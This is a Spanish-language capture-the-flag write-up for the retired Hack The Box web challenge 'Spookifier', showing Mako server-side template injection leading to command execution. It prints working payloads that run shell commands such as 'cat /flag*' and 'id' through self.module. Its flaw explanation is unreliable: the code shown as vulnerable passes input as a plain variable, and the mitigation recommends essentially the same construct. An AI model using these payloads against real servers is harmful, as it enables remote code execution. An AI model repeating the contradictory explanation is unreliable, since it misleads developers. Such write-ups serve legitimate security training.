---
challenge: Spookifier
type: Web
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [web, flask, mako, ssti, rce]
---


# Spookifier — Hack The Box

[⚑ English](README.en.md) | **Español**

> **Estado:** Retired. Reto resuelto; sin flags reales.

## TL;DR

Convertidor de texto con «estilos» que renderiza la entrada con **Mako**, el motor de plantillas de Python basado en `${}`. No hace falta cadena de globals: `self` está expuesto y desde ahí se llega a `os` en una línea.

## Enunciado y superficie

Un campo de texto y varios botones de estilo. Al enviar, el texto aparece «decorado»; el nombre del parámetro y el HTML sugieren plantillas del lado servidor.

## Reconocimiento

- Superficie reducida a lo que entrega el enunciado; el detalle está en «Enunciado y superficie».

## Análisis del código

- El reto no entrega código fuente; el análisis se apoya en el comportamiento descrito en «Explicación del fallo».

## Explicación del fallo

```python
from mako.template import Template

@app.route("/", methods=["POST"])
def index():
    text = request.form.get("text")
    return Template("${text}").render(text=text)
```

Mako evalua `${...}` como **expresión Python**, no como variable de plantilla. Comprobar:

```text
${7*7}      -> 49
${7*'7'}    -> 7777777
```

## Reproducción local

- Levanta la misma versión del servicio en un contenedor y apunta el exploit a `127.0.0.1`.

## Explotación

En Mako, `self` es el objeto `Template` y expone módulos internos:

```text
${self.module.cache.util.os.popen('cat /flag*').read()}
```

Otras rutas equivalentes:

```text
${self.module.cache.util.os.system('id')}
${self.template.module._os.popen('cat /flag*').read()}
${''.__class__.__mro__[1].__subclasses__()}
```

```text
HTB{<flag>}
```

## Evidencia

- Salidas recortadas de los comandos clave; sin flags, credenciales ni tokens.
- Los valores reales viven en `private/` y no se publican.

## Lecciones aprendidas

- **`${}` y no `{{ }}`**: Mako no comparte sintaxis con Jinja2; probar ambos y mirar cuál evalúa.
- **Contexto `self`**: la ruta exacta (`module.cache.util`) depende de la versión de Mako; si falla, volcar `self` con `${self}` y seguir el árbol.
- **Doble render**: si la salida se escapa, `str()` alrededor del `popen` no cambia nada; el problema suele ser el `Content-Type`.

- Mako evalúa expresiones, así que un `${text}` con entrada del usuario es RCE directo.
- `self.module` es el atajo clásico a `os` en Mako, equivalente a `config`/`cycler` en Jinja2.
- Mitigación: no construir plantillas con entrada; usar `Template(...).render(text=text)` con `${text}` en el fichero, no en una cadena dinámica.

## Mitigaciones y detección

- No construir plantillas con entrada del usuario; usar sandbox y contexto restringido.

## Referencias

- [ssti](../../knowledge/web/ssti.md)
- [rop-stack](../../knowledge/pwn/rop-stack.md)
